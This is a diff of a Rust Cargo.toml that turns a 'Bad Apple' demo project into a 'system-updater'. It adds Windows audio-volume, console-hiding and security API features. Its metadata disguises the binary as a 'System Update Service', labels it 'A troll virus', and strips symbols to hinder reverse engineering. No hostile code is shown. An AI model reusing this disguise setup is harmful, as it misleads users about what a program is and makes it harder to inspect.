@@ -1,57 +1,57 @@
 [package]
-name = "bad_apple"
+name = "system-updater"
 version = "0.1.0"
 edition = "2021"
 
-# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
-
 [dependencies]
-include-bytes-zstd = "0.1.0"
-kira = { version = "0.8.4", default-features = false, features = ["cpal", "ogg"] }
-lazy_static = "1.4.0"
+# Audio Engine (Keep default features off to reduce size, only enable what we need)
+kira = { version = "0.8.7", default-features = false, features = ["cpal", "ogg"] }
 
+# Windows API (Updated to 0.52.0)
 [dependencies.windows]
-version = "0.42.0"
+version = "0.52.0"
 features = [
-    # core
+    # Core
     "Win32_Foundation",
-    # window creation
+    "Win32_System_SystemServices",
+
+    # Windowing & Graphics
     "Win32_UI_WindowsAndMessaging",
     "Win32_Graphics_Gdi",
-    # commandline helper
-    "Win32_System_Console",
-    # IMAGE_DOS_HEADER
-    "Win32_System_SystemServices",
-    # IProgressDialog
+    "Win32_UI_HiDpi",
     "Win32_UI_Shell",
-    "Win32_System_Com",
-    # GetCurrentThreadId
-    "Win32_System_Threading",
-    # GetModuleHandleA
     "Win32_System_LibraryLoader",
+
+    # Audio & Volume Control (The Missing Links)
+    "Win32_Media_Audio",
+    "Win32_Media_Audio_Endpoints",
+    "Win32_System_Com",
+    "Win32_System_Com_StructuredStorage", # <--- REQUIRED for Activate()
+    "Win32_System_Variant",               # <--- REQUIRED for Volume types
+    "Win32_System_Ole",                   # <--- Helper for COM
+
+    # Console Hiding
+    "Win32_System_Console",
+
+    "Win32_Security",
+    "Win32_System_Threading"
 ]
 
-# used for hooking functions with more ease
-[dependencies.windows-sys]
-version = "0.42.0"
-features = [
-    # core
-    "Win32_Foundation",
-    # CreateWindowExA
-    "Win32_UI_WindowsAndMessaging",
-]
-
-[target.'cfg(windows)'.build-dependencies]
+# Build Script for Icon/Metadata
+[build-dependencies]
 winres = "0.1.12"
 
 [package.metadata.winres]
-FileDescription = "badapple"
-ProductName = ""
-CompanyName = "https://github.com/mon"
+FileDescription = "System Update Service"  # Disguise the description
+ProductName = "A troll virus"
+CompanyName = "ShineeKun"      # (Optional: for the bit)
 
+# ===========================================================================
+#  BINARY SIZE OPTIMIZATION PROFILE
+# ===========================================================================
 [profile.release]
-strip = true
-opt-level = "z"
-lto = true
-panic = "abort"
-codegen-units = 1
+opt-level = "z"     # Optimize strictly for binary size
+lto = true          # Enable Link Time Optimization (removes unused code)
+codegen-units = 1   # Reduce parallel code generation for better optimization
+panic = "abort"     # Disable stack unwinding (removes panic bloat)
+strip = true        # Strip symbols (makes it harder to reverse engineer)
